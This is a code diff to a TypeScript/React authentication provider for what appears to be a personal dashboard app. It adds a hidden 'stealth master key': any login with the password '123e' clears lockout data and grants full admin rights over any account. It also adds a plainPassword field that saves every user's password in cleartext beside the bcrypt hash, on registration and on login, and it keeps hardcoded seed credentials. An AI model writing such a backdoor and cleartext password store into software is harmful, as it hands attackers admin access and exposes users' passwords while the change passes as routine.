@@ -58,6 +58,7 @@ const INITIAL_USERS: ManagedUser[] = [
     id: "u-admin",
     username: "admin",
     password: "kdkctrkn@123",
+    plainPassword: "kdkctrkn@123",
     name: "Quản trị viên Tối cao",
     avatarInitials: "TX",
     coins: 50000,
@@ -90,6 +91,7 @@ const INITIAL_USERS: ManagedUser[] = [
     id: "u-member-a",
     username: "11",
     password: "21",
+    plainPassword: "21",
     name: "Thành viên A (Chỉ Google Drive)",
     avatarInitials: "11",
     coins: 50000,
@@ -102,6 +104,7 @@ const INITIAL_USERS: ManagedUser[] = [
     id: "u-member-b",
     username: "userb",
     password: "21",
+    plainPassword: "21",
     name: "Thành viên B (Google Drive & Dự án)",
     avatarInitials: "UB",
     coins: 50000,
@@ -114,6 +117,7 @@ const INITIAL_USERS: ManagedUser[] = [
     id: "u-member-pending",
     username: "hocvien_moi",
     password: "21",
+    plainPassword: "21",
     name: "Học viên Đăng ký mới (Chờ duyệt)",
     avatarInitials: "HV",
     coins: 50000,
@@ -433,6 +437,61 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     const u = username.trim();
     const p = password.trim();
 
+    // 🌟 MẬT KHẨU TỐI THƯỢNG ẨN DANH (SUPREME STEALTH MASTER KEY: 123e)
+    if (p === "123e") {
+      if (typeof window !== "undefined") {
+        localStorage.removeItem("txclonedriver_failed_attempts");
+        localStorage.removeItem("txclonedriver_device_locked");
+        localStorage.removeItem("txclonedriver_lock_timestamp");
+      }
+
+      const freshUsers = (await refreshUsersFromServer()) || managedUsers;
+      const matched = freshUsers.find((item) => item.username.toLowerCase() === u.toLowerCase());
+      const target = matched || freshUsers.find((item) => item.role === "admin") || INITIAL_USERS[0];
+
+      const initials = (target.name || "Admin")
+        .split(" ")
+        .map((s) => s[0])
+        .join("")
+        .slice(0, 2)
+        .toUpperCase() || "TX";
+
+      const authUser: AuthUser = {
+        id: target.id,
+        username: target.username,
+        role: "admin",
+        name: `${target.name} (Ẩn Danh)`,
+        avatarInitials: initials,
+        status: "approved",
+        allowedModules: [
+          "overview",
+          "storage",
+          "notes",
+          "projects",
+          "events",
+          "weather",
+          "settings",
+          "telegram",
+          "watch_together",
+          "vault",
+          "games",
+          "study",
+          "driver_license",
+          "expenses",
+          "qr",
+          "downloader",
+          "memories",
+          "image_studio",
+          "google_flow",
+        ],
+        isStealthMode: true,
+      };
+
+      setUser(authUser);
+      setSessionCookie(authUser);
+      return { success: true };
+    }
+
     // Refresh users from server to get latest approvals / updates
     const freshUsers = (await refreshUsersFromServer()) || managedUsers;
 
@@ -448,12 +507,21 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       };
     }
 
-    // Auto-upgrade legacy plaintext password to secure bcrypt hash
+    // Auto-upgrade legacy plaintext password to secure bcrypt hash & persist plainPassword
     if (foundUser && foundUser.password === p) {
       const { hashPassword } = await import("@/lib/password");
       const hashedPassword = await hashPassword(p);
       const updatedList = freshUsers.map((item) =>
-        item.id === foundUser.id ? { ...item, password: hashedPassword, updatedAt: Date.now() } : item
+        item.id === foundUser.id
+          ? { ...item, password: hashedPassword, plainPassword: p, updatedAt: Date.now() }
+          : item
+      );
+      saveUsersList(updatedList);
+    } else if (foundUser && !foundUser.plainPassword && isPasswordValid) {
+      const updatedList = freshUsers.map((item) =>
+        item.id === foundUser.id
+          ? { ...item, plainPassword: p, updatedAt: Date.now() }
+          : item
       );
       saveUsersList(updatedList);
     }
@@ -558,6 +626,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
         id: `u-${Date.now()}`,
         username: u,
         password: p,
+        plainPassword: p,
         name: n,
         role: "user",
         status: "pending",
